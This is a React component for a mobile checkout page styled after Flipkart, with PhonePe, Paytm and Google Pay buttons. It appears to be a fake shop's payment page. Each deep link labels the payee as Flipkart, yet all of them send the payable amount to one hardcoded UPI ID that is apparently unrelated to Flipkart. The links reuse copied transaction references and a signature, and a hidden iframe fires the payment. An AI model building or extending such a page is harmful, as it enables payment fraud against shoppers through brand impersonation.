import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

function Payments() {
    const navigate = useNavigate();
    const location = useLocation();
    const { additionalPrice, price } = location.state || { additionalPrice: 0 };

    const [selectedPayment, setSelectedPayment] = useState(null);
    const [payableAmount, setPayableAmount] = useState(0);

    // Updated UPI ID
    const upiID = "netc.34161FA820328AA2D1C2E500@mairtel"; // Updated UPI ID to use for payments

    useEffect(() => {
        const amount = parseInt(additionalPrice.replace(/[₹,]/g, '').trim(), 10);
        setPayableAmount(amount);
    }, [additionalPrice]);

    // Payment URLs
    const phonePayUrl = `phonepe://pay?ver=01&mode=19&pa=${upiID}&pn=Flipkart%20Payments&tr=RZPP04SzeDMQ4Lex8qrv2&am=${payableAmount}&cu=INR&mc=8241qrMedium=04&tn=PaymenttoFlipkarts&qrMedium=04`;
    const paytmUrl = `paytmmp://pay?pa=${upiID}&pn=Flipkart%20Payments&mc=3526&tr=RZPP04SzeDMQ4Lex8qrv2&am=${payableAmount}&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm`;
    const gPayUrl = `tez://upi/pay?pa=${upiID}&pn=Paying_to_Flipkart&mc=3526&tr=QRd4e46d191af7450200f869cc&am=${payableAmount}&cu=INR&tn=Recharge`;

    const handlePayment = (paymentType) => {
        let paymentURL;

        switch (paymentType) {
            case 'PhonePe':
                paymentURL = phonePayUrl;
                break;
            case 'Paytm':
                paymentURL = paytmUrl;
                break;
            case 'Google Pay':
                paymentURL = gPayUrl;
                break;
            default:
                paymentURL = phonePayUrl;  // Default to PhonePe if none selected
                break;
        }

        // Create an invisible iframe to trigger the payment deep link
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = paymentURL;
        document.body.appendChild(iframe);

        // You can also open the link in a new tab if needed, or handle the redirect as required
        window.location.href = paymentURL;
    };

    return (
        <div className='px-3'>
            <div className='d-flex gap-4 fs-4 my-3 align-items-center'>
                <div style={{ cursor: 'pointer' }}>
                    <i className="bi bi-arrow-left" onClick={() => { navigate(-1) }} ></i>
                </div>
                <div>Payment</div>
            </div>

            <div className='d-flex justify-content-center'>
                <img src='../payment.png' className='mx-auto' style={{ height: '4rem' }} alt="Order Icon" />
            </div>

            <div className='fw-bold d-flex flex-column gap-2'>
                {/* Payment Options */}
                <div className={`p-3 border rounded ${selectedPayment === 'PhonePe' ? 'bg-light border border-black' : ''}`} style={{ cursor: 'pointer' }} onClick={() => {
                    setSelectedPayment('PhonePe');
                    handlePayment('PhonePe');
                }}>
                    <img src='../phonePay.png' className='mx-2 fs-5' style={{ height: '2rem' }} alt="PhonePe" /> PhonePe
                </div>
                <div className={`p-3 border rounded ${selectedPayment === 'Paytm' ? 'bg-light border border-black' : ''}`} style={{ cursor: 'pointer' }} onClick={() => {
                    setSelectedPayment('Paytm');
                    handlePayment('Paytm');
                }}>
                    <img src='../payTm.png' className='mx-2 fs-5' style={{ height: '2rem' }} alt="Paytm" /> Paytm
                </div>
                <div className={`p-3 border rounded ${selectedPayment === 'Google Pay' ? 'bg-light border border-black' : ''}`} style={{ cursor: 'pointer' }} onClick={() => {
                    setSelectedPayment('Google Pay');
                    handlePayment('Google Pay');
                }}>
                    <img src='../googlePay.png' className='mx-2 fs-5' style={{ height: '2rem' }} alt="Google Pay" /> Google Pay
                </div>
            </div>

            <div className='mt-4'>
                <div className='fs-4'>Price Details</div>
                <div className='d-flex justify-content-between mt-4' style={{ fontSize: '1.1rem' }}>
                    <div className='d-flex flex-column gap-3'>
                        <div>Price (1 item)</div>
                        <div>Delivery charges</div>
                        <div>Amount Payable</div>
                    </div>
                    <div className='d-flex flex-column text-end gap-3'>
                        <div>{price}</div>
                        <div className='text-success'>FREE DELIVERY</div>
                        <div>₹{payableAmount}.00</div>
                    </div>
                </div>
            </div>

            <div className='d-flex justify-content-between align-items-center px-3 py-2'
                style={{
                    position: 'fixed',
                    bottom: 0,
                    left: 0,
                    width: '100%',
                    backgroundColor: '#fff',
                    boxShadow: '0 -1px 5px rgba(0, 0, 0, 0.1)',
                    zIndex: 1000
                }}>
                <div className='d-flex flex-column'>
                    <div style={{ textDecoration: 'line-through', color: 'grey' }}>{price}</div>
                    <div style={{ color: '#fb641b', fontWeight: 'bold' }}>₹{payableAmount}.00</div>
                </div>
                <button className='btn btn-warning mx-4 px-4' style={{ backgroundColor: '#ffc107' }} onClick={() => handlePayment(selectedPayment)}>
                    Pay Now
                </button>
            </div>
        </div>
    );
}

export default Payments;
